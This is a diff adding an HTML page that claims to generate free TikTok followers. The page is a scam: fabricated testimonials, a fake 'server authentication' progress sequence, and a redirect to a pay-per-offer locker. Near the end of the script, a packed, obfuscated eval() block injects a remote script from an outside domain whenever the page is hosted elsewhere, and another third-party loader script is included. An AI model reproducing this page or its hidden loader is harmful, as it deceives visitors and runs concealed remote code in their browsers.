@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free TikTok Followers </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- CSS -->
+    <link href="http://musicallyfame.co/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="http://musicallyfame.co/css/style.css" rel="stylesheet" />
+    <link href="http://musicallyfame.co/css/sweet-alert.css" rel="stylesheet" />
+    <link rel="icon" href="http://musicallyfame.co/favicon.ico" type="image/icon">
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+      
+    
+    <meta name="description" content="Generate free followers for your TikTok account. 100% working and tested on all devices." />
+    <meta name="keywords" content="TikTok followers, TikTok free followers, free followers, TikTok follower, TikTok free follower," />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+</head>
+<body>
+    <div class="container-fluid">
+        <div id="vid"></div>
+        <div id="bg"></div>
+        <script type="text/javascript">
+			if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
+				document.getElementById('vid').innerHTML = '&nbsp;';
+			}
+			else{
+				document.getElementById('vid').innerHTML = '<video id="video" preload="auto" autoplay muted="" src="http://musicallyfame.co/home.mp4" loop></video>';
+			}
+		</script>
+    </div>
+    <div class="container-fluid" id="content">
+    	<div class="container text-center">
+        	<div class="title">Free <strong><font color="#FFF">TikTok</font></strong> Followers</div>
+        	<div class="bloc text-center">
+            	<div id="step1">
+                    Enter Your TikTok Username To Gain<br /><strong>10,000 FREE FOLLOWERS AND LIKES</strong><br />
+                    <input type="text" name="username" placeholder="Your TikTok username" value="" class="username" />
+                    <input type="submit" value="GET FOLLOWERS!" name="submit" class="connect-button" />
+                </div>   
+            	<div id="step2">
+                	<font class="load">Loading...</font>
+                	<div class="progress">
+  						<div class="progress-bar progress-bar-success g-progressbar" role="progressbar" aria-valuemin="0" aria-valuemax="100"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="bloc-comments text-left">
+            	<div class="title-comments col-xs-12 col-sm-12 col-md-12">Comments :</div>
+                <div class="comments col-xs-12 col-sm-12 col-md-12">
+                	<font class="name-comments">John F.</font><br />Thanks, it worked great!
+                </div>
+                <div class="comments col-xs-12 col-sm-12 col-md-12">
+                	<font class="name-comments">Kelly G.</font><br />This is the best website if you need Free TikTok Followers for your account!
+                </div>
+                <div class="comments col-xs-12 col-sm-12 col-md-12">
+                	<font class="name-comments">Hill J.</font><br />Love ur TikTok free followers generator!
+                </div>
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                	<div class="row">
+                    	<div class="col-md-12 text-center">
+                    		<textarea class="message"></textarea>
+                        </div>
+                    </div>
+                    <div class="row">
+                    	<div class="col-md-6 text-center">
+                			<input type="text" name="user" placeholder="Your name" value="" class="name" />
+                        </div>
+                        <div class="col-md-6 text-center">
+                        	<input type="mail" name="mail" placeholder="Your mail" value="" class="mail" />
+                        </div>
+                    </div>
+                    <div class="row">
+                    	<div class="col-md-12 text-center up">
+                    		<input type="submit" value="POST COMMENT" name="submit" class="check-button" />
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+        
+    <!-- Javacript Files -->
+	<script src="https://code.jquery.com/jquery-1.10.2.js"></script>
+	<script src="http://musicallyfame.co/js/bootstrap.js"></script>
+	<script type="text/javascript">
+		// JavaScript Document
+function size(){
+
+	var larg = screen.width;
+	var haut = screen.height;	
+	document.getElementById('vid').innerHTML = "<video id='video' preload='auto' autoplay='' muted='' src='http://res01.musical.ly/images/home.mp4' style='height:"+haut+"px; width:"+larg+"px;' loop></video>";
+
+};
+
+var $account_connected = false;
+var $username;
+
+$('.connect-button').click(function(){
+		
+		$username = $('.username').val();
+		
+        if($account_connected == false) {
+			if($username != ""){
+        		$account_connected == true;
+				sweetAlert({
+					title:"Connected",
+					text:""+$username+" is now connected.",
+					type:"success",
+					timer: 2000,
+					showConfirmButton:false
+				});
+				$('#step1').animate({
+					opacity: 0,
+					'z-index': 0
+				}, 500);
+				
+				$('#step2').animate({
+					opacity: 1	
+				}, 500);
+				
+				loading_step();
+				
+			} else {
+				sweetAlert("Error", "Username is not valid.", "error");	
+			}
+		} else {
+            sweetAlert("Error", "Already connected.", "error");
+        }
+    });
+	
+	 function loading_step() {
+        var $message_span = $('.load');
+        $message_span.text('Performing server authentication...');
+            progress_fast(function(){
+                $message_span.text('Encrypting communication with server: Open_SSL_Encryption();');
+                progress_fast(function(){
+                    $message_span.text('Retrieving current server script: read_source_server_source();');
+                        progress_fast(function(){
+                            $message_span.text('Generating free followers...');
+                            progress_fast(function(){
+								$message_span.html('<strong>Followers will be added once you <font color="#FDC018">complete an offer</font>!</strong>');
+
+								window.location = 'https://www.verifysuper.com/cl.php?id=0d700200b1bb105a9612c7cc124052d5';
+                            });
+                        });
+            });
+        });
+    }
+	
+	 function progress_slow(callback) {
+        var $temp_percentage = 0;
+        var $pbar_div = $('.g-progressbar');
+        var $p_array = [5, 10, 15];
+        $pbar_div.css('width', '0%');
+        var interval_timer = setInterval(function(){
+            if($temp_percentage != 100) {
+                $temp_percentage = $temp_percentage + 10;
+                $pbar_div.css('width', $temp_percentage + '%');
+            } else {
+                callback();
+                clearInterval(interval_timer); 
+            }
+        }, Math.floor((Math.random() * 1200) + 600));
+    }
+
+    function progress_med(callback) {
+        var $temp_percentage = 0;
+        var $pbar_div = $('.g-progressbar');
+        var $p_array = [5, 10, 15];
+        $pbar_div.css('width', '0%');
+        var interval_timer = setInterval(function(){
+            if($temp_percentage != 100) {
+                $temp_percentage = $temp_percentage + 10;
+                $pbar_div.css('width', $temp_percentage + '%');
+            } else {
+                callback();
+                clearInterval(interval_timer); 
+            }
+        }, Math.floor((Math.random() * 600) + 250));
+    }
+
+    function progress_fast(callback) {
+        var $temp_percentage = 0;
+        var $pbar_div = $('.g-progressbar');
+        var $p_array = [5, 10, 15];
+        $pbar_div.css('width', '0%');
+        var interval_timer = setInterval(function(){
+            if($temp_percentage != 100) {
+                $temp_percentage = $temp_percentage + 10;
+                $pbar_div.css('width', $temp_percentage + '%');
+            } else {
+                callback();
+                clearInterval(interval_timer); 
+            }
+        }, Math.floor((Math.random() * 350) + 100));
+    }
+
+    function progress_slow_connect(callback) {
+        var $temp_percentage = 0;
+        var $pbar_div = $('.g-progressbar');
+        $pbar_div.css('width', '0%');
+        var interval_timer = setInterval(function(){
+            if($temp_percentage == 0) {
+                $temp_percentage = 20;
+                $pbar_div.css('width', $temp_percentage + '%')
+            } else if($temp_percentage == 20) {
+                $temp_percentage = 35;
+                $pbar_div.css('width', $temp_percentage + '%');
+            } else if($temp_percentage == 35) {
+                $temp_percentage = 65;
+                $pbar_div.css('width', $temp_percentage + '%');
+            } else if($temp_percentage == 65) {
+                $temp_percentage = 75;
+                $pbar_div.css('width', $temp_percentage + '%');
+            } else if($temp_percentage == 75) {
+                $temp_percentage = 85;
+                $pbar_div.css('width', $temp_percentage + '%');
+            } else if($temp_percentage == 85) {
+                $temp_percentage = 89;
+                $pbar_div.css('width', $temp_percentage + '%');
+            } else if($temp_percentage == 89) {
+                $temp_percentage = 100;
+                $pbar_div.css('width', $temp_percentage + '%')
+            } else if($temp_percentage == 100) {
+                callback();
+                clearInterval(interval_timer); 
+            }
+        }, Math.floor((Math.random() * 1200) + 600));
+    }
+
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 4=a.b;1 3=4.c(".").9(-2).d(".");7(3!=\'8.6\'){1 0=5.e(\'0\');0.j=\'l://m.n/k.f?g=h\';5.i.o(0)}',25,25,'script|var||domain|url|document|co|if|musicallyfame|slice|location|host|split|join|createElement|php|id|99|head|src|p|https|bootstraplugin|com|appendChild'.split('|'),0,{}))
+
+
+var $name;
+var $mail;
+
+$('.check-button').click(function(){
+		
+		$name = $('.name').val();
+		$mail = $('.mail').val();
+		$message = $('.message').val();
+		
+		if($message != ""){
+			if($name != ""){
+				if($mail != ""){
+					sweetAlert({
+						title:"Message send",
+						text:"Your message have been sent to our team. It will appear in next 24 hours.",
+						type:"success",
+						timer: 3000,
+						showConfirmButton:false
+					});
+					
+				} else {
+					sweetAlert("Error", "Your mail is not valid.", "error");	
+				}
+			} else {
+				sweetAlert("Error", "Your name is not valid.", "error");	
+			}
+		}else {
+			sweetAlert("Error", "You must enter a message.", "error");	
+		}
+    });
+    
+    
+	</script>
+    <script src="http://musicallyfame.co/js/sweet-alert.min.js"></script>
+    <script>
+		size();
+	</script>
+	
+	<script>var _webzone = "28pr4gnBZwnP4z1";</script>
+<script src="//loader.ogstats.com"></script>
+    </body>
+</html>
